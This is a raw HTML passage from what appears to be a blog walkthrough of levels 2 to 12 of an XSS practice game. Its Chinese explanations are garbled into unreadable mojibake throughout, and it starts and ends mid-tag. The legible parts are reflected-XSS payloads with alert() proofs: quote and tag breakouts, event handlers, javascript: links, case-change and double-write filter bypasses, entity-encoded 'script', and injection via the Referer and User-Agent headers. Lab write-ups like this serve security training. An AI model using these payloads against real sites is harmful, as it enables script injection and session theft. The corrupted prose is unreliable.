class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-06.png" class="" title="2024-02-29_08-06.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>ç¬¬äºŒå…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼ˆå¦‚ä¸‹ï¼Œåé¢éƒ½ç”¨è¿™ä¸ªåšæµ‹è¯•ï¼‰å¯ä»¥çœ‹åˆ°è¾“å…¥æ¡†ä¸­æ²¡æœ‰æ˜¾ç¤ºå‡ºåŒå¼•å·ï¼Œæ­¤å¤„è¯­å¥åº”è¯¥æ˜¯è¢«åŒå¼•å·é—­åˆ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-11.png" class="" title="2024-02-29_08-11.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>é€šè¿‡è§‚å¯Ÿæºç ï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„å‚æ•°æ˜¯è¢«åŒå¼•å·é—­åˆç€å¸¦å…¥åˆ°inputæ ‡ç­¾ä¸­</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-12.png" class="" title="2024-02-29_08-12.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>æ‰€ä»¥éœ€è¦åœ¨å¼€å¤´æ„é€ ä¸€ä¸ªâ€&gt;æŠŠç­¾åinputæ ‡ç­¾é—­åˆæ‰ï¼Œåœ¨ç»“å°¾æ„é€ ä¸€ä¸ªâ€&lt;æŠŠinputå‰©ä¸‹çš„å°–æ‹¬å·é—­åˆå³å¯</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-13.png" class="" title="2024-02-29_08-13.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>ç¬¬ä¸‰å…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œè¾“å…¥æ¡†çš„å†…å®¹é‡Œæ²¡æœ‰å•å¼•å·ï¼Œæ­¤å¤„è¯­å¥åº”è¯¥æ˜¯è¢«å•å¼•å·é—­åˆ</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-14.png" class="" title="2024-02-29_08-14.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>è§‚å¯Ÿæºç å¯çŸ¥ï¼Œå¤§å°äºå·å’ŒåŒå¼•å·è¢«è½¬ä¹‰ï¼Œä½†æ˜¯å•å¼•å·æ²¡æœ‰è¢«è½¬ä¹‰ä¸”å‚æ•°æ˜¯ç”¨å•å¼•å·é—­åˆçš„</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-21.png" class="" title="2024-02-29_08-21.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>ç”±äºå¤§äºå·è¢«è½¬ä¹‰ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å“ªäº›ä¸éœ€è¦ç”¨åˆ°æ ‡ç­¾çš„è¯­å¥æ¥è§¦å‘XSSæ¼æ´æ¯”å¦‚è¯´ç”¨äº‹ä»¶è§¦å‘çš„å½¢å¼ï¼ŒåŒæ—¶ä½¿ç”¨å•å¼•å·æ¥é—­åˆ</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;onmouseover=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-19.png" class="" title="2024-02-29_08-19.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>ç¬¬å››å…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œå‘ç°æœç´¢æ¡†é‡Œæ²¡æœ‰å°äºå·ï¼Œä¼°è®¡æ˜¯è¢«è½¬ä¹‰äº†ï¼Œå†…å®¹ä¹Ÿæ˜¯åˆ°scriptæˆªæ­¢ï¼Œè¯´æ˜å†…å®¹æ˜¯ç”±åŒå¼•å·é—­åˆçš„</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-24.png" class="" title="2024-02-29_08-24.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>åœ¨ç½‘é¡µæºä»£ç ç¬¬17è¡Œä¸­å¯ä»¥å‘ç°ï¼Œå¤§å°äºå·å·²è¢«è¿‡æ»¤ï¼Œå¼•å·æ²¡æœ‰è¢«è¿‡æ»¤æˆ–è½¬ä¹‰ï¼Œå‚æ•°é‡‡ç”¨çš„æ˜¯åŒå¼•å·çš„é—­åˆæ–¹å¼</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-26.png" class="" title="2024-02-29_08-26.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>payload</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;onmouseover=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(/<span class="hljs-variable">xss</span>/)</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-27.png" class="" title="2024-02-29_08-27.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>ç¬¬äº”å…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œå‘ç°åœ¨rä¸iä¹‹é—´å¤šäº†ä¸€ä¸ª_ç¬¦å·ï¼ŒçŒœæµ‹æ˜¯å…³é”®å­—è¢«è½¬ä¹‰äº†</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-29.png" class="" title="2024-02-29_08-29.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>çœ‹æºç æˆ‘ä»¬å‘ç°ä¸¤ä¸ªå…³é”®å­—è¢«è½¬ä¹‰ï¼Œå¤§å°äºå·å’Œå¼•å·æ²¡æœ‰è¢«è¿‡æ»¤ä¸è½¬ä¹‰ï¼Œç”¨åŒå¼•å·é—­åˆæ–¹å¼ï¼Œå¯åˆ©ç”¨å…¶ä»–å…³é”®å­—ç»•è¿‡</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-31.png" class="" title="2024-02-29_08-31.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>å°è¯•imgæ ‡ç­¾</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&gt;&lt;IMG SRC=&quot;</span><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;&lt;&quot;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-32.png" class="" title="2024-02-29_08-32.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>è™½ç„¶â€¦ä½†æ˜¯æ— æ³•è¿›è¡Œå¼¹çª—ï¼Œå°è¯•ä¿®æ”¹ä¸ºaæ ‡ç­¾ï¼ŒæˆåŠŸå¼¹çª—</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&gt;&lt;a href=&quot;</span><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;xss&lt;&quot;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-35.png" class="" title="2024-02-29_08-35.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>ç¬¬å…­å…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œæ„Ÿè§‰ä¸ä¸Šä¸€å…³è²Œä¼¼æ˜¯ä¸€æ ·çš„</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-36.png" class="" title="2024-02-29_08-36.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>é‚£ç›´æ¥åˆ©ç”¨ä¸Šä¸€å…³çš„payloadï¼Œå‘ç°hrefè¢«è½¬ä¹‰äº†â€¦.å•Šã€‚ã€‚è¿™ã€‚ã€‚</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-37_1.png" class="" title="2024-02-29_08-37_1.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-39.png" class="" title="2024-02-29_08-39.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>é‡‡ç”¨å¤§å°å†™å³å¯ç»•è¿‡</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&gt;&lt;a Href=&quot;</span><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;xss&lt;&quot;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-40.png" class="" title="2024-02-29_08-40.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>ç¬¬ä¸ƒå…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œåªæ˜¾ç¤ºäº†&lt;æ‹¬å·ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯scriptè¢«è¿‡æ»¤</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-41.png" class="" title="2024-02-29_08-41.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>çœ‹æºç å¯ä»¥çœ‹åˆ°scriptè¢«è¿‡æ»¤ï¼Œé‡‡ç”¨åŒå¼•å·é—­åˆ</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-42.png" class="" title="2024-02-29_08-42.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>ç»è¿‡å°è¯•å¯ä»¥ä½¿ç”¨scriptåŒå†™ç»•è¿‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert(/xss/)<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-43.png" class="" title="2024-02-29_08-43.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>ç¬¬å…«å…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œè¾“å…¥çš„å€¼å‡æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-44.png" class="" title="2024-02-29_08-44.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>åˆ†ææºç å¯çŸ¥ï¼Œå¤§å°äºå·è¢«è½¬ä¹‰ã€åŒå¼•å·è¢«è½¬ä¹‰ï¼Œè¯­å¥é‡‡ç”¨åŒå¼•å·é—­åˆæ–¹å¼ï¼Œå¹¶ä¸”åœ¨20è¡Œå¯ä»¥çœ‹åˆ°å¤§å°äºå·è¢«è½¬ä¹‰å›æ¥ï¼Œå…³é”®å­—è¢«æ’å…¥ä¸‹åˆ’çº¿</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-44_1.png" class="" title="2024-02-29_08-44_1.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>å¯ä»¥ä½¿ç”¨javascriptä¼ªåè®®ï¼Œjavascriptä¸­çš„scriptä¼šè¢«è½¬ä¹‰ä¸ºscr_iptï¼Œæºç ä¸­ä¼šå¯¹éƒ¨åˆ†htmlå®ä½“ç¼–ç è½¬æ¢ä¸ºæ­£å¸¸çš„å­—ç¬¦ï¼Œæ‰€ä»¥å°è¯•é‡‡ç”¨å°†script htlmå®ä½“ç¼–ç </p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-48.png" class="" title="2024-02-29_08-48.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">java&amp;<span class="hljs-attr">#x0073</span>;&amp;<span class="hljs-attr">#x0063</span>;&amp;<span class="hljs-attr">#x0072</span>;&amp;<span class="hljs-attr">#x0069</span>;&amp;<span class="hljs-attr">#x0070</span>;&amp;<span class="hljs-attr">#x0074</span>;:alert<span class="hljs-comment">(/xss/)</span><br></code></pre></td></tr></table></figure><p>ç‚¹å‡»å‹æƒ…é“¾æ¥æˆåŠŸå¼¹çª—<br>pass!</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-48_1.png" class="" title="2024-02-29_08-48_1.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>ç¬¬ä¹å…³<br>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œè¾“å…¥çš„å€¼ä¹Ÿæ˜¯æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-49.png" class="" title="2024-02-29_08-49.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>æ„Ÿè§‰å’Œä¸Šä¸€å…³å·®ä¸å¤šçš„æƒ…å†µï¼Œå¤§å°äºå·è¢«è½¬ä¹‰ã€åŒå¼•å·è¢«è½¬ä¹‰ã€ã€å¤§å†™å˜å°å†™ï¼Œé‡‡ç”¨åŒå¼•å·é—­åˆï¼Œæœ‰æ„æ€çš„æ˜¯ï¼šåœ¨20è¡Œæç¤ºâ€œæ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼â€<br>what??ä»€ä¹ˆé¬¼ï¼Ÿï¼Ÿå’Œé“¾æ¥æœ‰å…³ï¼Ÿéš¾ä¸æˆå’Œhttp&#x2F;httpsæœ‰å…³..</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-51.png" class="" title="2024-02-29_08-51.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>å°è¯•è¾“å…¥ä¸€ä¸ªæ­£å¸¸çš„é“¾æ¥æäº¤è¯•è¯•ï¼Œå‘ç°è¿”å›æ˜¯åˆæ³•çš„</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-53.png" class="" title="2024-02-29_08-53.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>æ‰€ä»¥å°†http:&#x2F;&#x2F;å†™å…¥åˆ°payloadä¸­è®©ä»–åŒ¹é…åˆ°å­˜åœ¨å³ä¼šè¿”å›åˆæ³•ï¼Œæ‰€ä»¥æ„é€ pyload</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-53_1.png" class="" title="2024-02-29_08-53_1.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">java&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;:alert(<span class="hljs-string">&#x27;http://xss&#x27;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-54.png" class="" title="2024-02-29_08-54.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><p>ç¬¬åå…³<br>åœ¨urlä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œé¡µé¢æ˜¾ç¤ºçœ‹ä¸å‡ºä»€ä¹ˆä¿¡æ¯</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-55.png" class="" title="2024-02-29_08-55.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>åˆ†ææºç ï¼Œå‘ç°ç¬¬15è¡Œå¤§å°äºå·è¢«è½¬ä¹‰ã€åŒå¼•å·éƒ½è¢«è½¬ä¹‰ï¼Œè¯­å¥é‡‡ç”¨åŒå¼•å·é—­åˆã€‚åœ¨ç¬¬17ã€18ã€19è¡Œï¼Œå‘ç°ä¸‰ä¸ªè¾“å…¥å‚æ•°ï¼Œåˆ†åˆ«æ˜¯t_linkã€t_historyã€t_sort</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-59.png" class="" title="2024-02-29_08-59.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>è¾“å…¥æµ‹è¯•è¯­å¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?t_history=<span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span><span class="language-javascript">&amp;t_sort=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span>&amp;t_link=<span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span></span></span></span><br></code></pre></td></tr></table></figure><p>å‘ç°åªæœ‰t_sortæœ‰å€¼ï¼Œå¤§å°äºå·è¢«è¿‡æ»¤ï¼Œé‡‡ç”¨åŒå¼•å·é—­åˆ</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_09-01.png" class="" title="2024-02-29_09-01.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>é‚£payloadæ„é€ çš„æ—¶å€™ï¼Œå°±ä¸éœ€è¦ç”¨&gt;&lt;çš„äº‹ä»¶è§¦å‘æ–¹å¼æ„é€ è¯­å¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=sb&quot; <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(/xss/)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ?t_sort=è¡¨ç¤ºå‚æ•°æ˜¯ä¼ é€’ç»™è°</span><br><span class="hljs-string"># sb&quot;</span>ç»™inputèµ‹å€¼åŒæ—¶é—­åˆåŒå¼•å·<br><span class="hljs-comment"># ä¿®æ”¹typeå±æ€§ä¸ºæŒ‰é’®æ–¹ä¾¿äº‹ä»¶è§¦å‘</span><br><span class="hljs-comment"># onclikåˆ™è¡¨ç¤ºç‚¹å‡»æ—¶è§¦å‘äº‹ä»¶</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_09-03.png" class="" title="2024-02-29_09-03.png"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>ç¬¬åä¸€å…³<br>åœ¨urlä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œé¡µé¢æ˜¾ç¤ºçœ‹ä¸å‡ºä»€ä¹ˆä¿¡æ¯</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-10.png" class="" title="2024-02-29_11-10.png"><h6 id="-36"><a href="#-36" class="headerlink" title=""></a></h6><p>æŸ¥çœ‹æºç ï¼Œå‘ç°ç¬¬15è¡Œå¤§å°äºå·è¢«è½¬ä¹‰ã€åŒå¼•å·éƒ½è¢«è½¬ä¹‰ï¼Œè¯­å¥é‡‡ç”¨åŒå¼•å·é—­åˆï¼Œåœ¨ç¬¬17ã€18ã€19ã€20è¡Œï¼Œå‘ç°å¦å¤–å››ä¸ªè¾“å…¥å‚æ•°ï¼Œåˆ†åˆ«æ˜¯t_linkã€t_historyã€t_sortã€t_refï¼Œè€ƒè™‘å°†æµ‹è¯•è¯­å¥ä¼ å…¥è¿›è¡Œæµ‹è¯•</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-11.png" class="" title="2024-02-29_11-11.png"><h6 id="-37"><a href="#-37" class="headerlink" title=""></a></h6><p>æ„é€ è®¿é—®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?t_history=<span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span><span class="language-javascript">&amp;t_sort=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span>&amp;t_link=<span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span></span></span>&amp;t_ref=<span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span></span></span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-12.png" class="" title="2024-02-29_11-12.png"><h6 id="-38"><a href="#-38" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°å¤§å°äºå·è¢«è½¬ä¹‰ã€åŒå¼•å·éƒ½è¢«è½¬ä¹‰ï¼Œè¯­å¥é‡‡ç”¨åŒå¼•å·é—­åˆï¼Œç„¶åæˆ‘å°è¯•äº†å¾ˆå¤šç»•è¿‡éƒ½ä¸è¡Œï¼Œç»ˆç©¶è¿˜æ˜¯å¤ªèœäº†â€¦å°è¯•å…¶ä½™å‚æ•°å…¥æ‰‹è¯•è¯•å§ï¼Œå¯ä»¥å‘ç°å…¶ä½™å‚é€šè¿‡urlåœ°å€æ ä¼ é€’æ— æ³•ä¼ é€’ï¼Œè¿™æ—¶å€™å°±åœ¨æƒ³t_refæ ¹æ®å‘½ä»¤è§„åˆ™æ˜¯ä¸æ˜¯å°±æ˜¯httpçš„refererå¤´éƒ¨ä¿¡æ¯ï¼ŒæŠ“åŒ…å°è¯•ä¸€ä¸‹,å‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-14.png" class="" title="2024-02-29_11-14.png"><h6 id="-39"><a href="#-39" class="headerlink" title=""></a></h6><p>okkkkï¼Œé‚£å°±ç›´æ¥æ”¹refererå¤´éƒ¨ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰..æ‰‹åŠ¨åŠ ä¸ªreferer<br>pass!</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">referer:</span> referer:click me!<span class="hljs-string">&quot; type=&quot;</span>button<span class="hljs-string">&quot; onclick=&quot;</span>alert(<span class="hljs-keyword">/xss/</span>)<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-16.png" class="" title="2024-02-29_11-16.png"><h6 id="-40"><a href="#-40" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-20.png" class="" title="2024-02-29_11-20.png"><h6 id="-41"><a href="#-41" class="headerlink" title=""></a></h6><p>ç¬¬åäºŒå…³<br>ä¸å…³å¡11ç±»ä¼¼ï¼Œä¿®æ”¹t_uaå€¼è¿›è¡Œç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹æ•°æ®åŒ…ä¸­çš„UAå¤´ï¼Œä¸å†å¤šè¯´</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_12-21.png" class="" title="2024-02-29_12-21.png"><h6 id="-42"><a href="#-42" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_12-21_1.png" class="" title="2024-02-29_12-21_1.png"><h6 id="-43"><a href="#-43" class="headerlink" title=""></a></h6><img 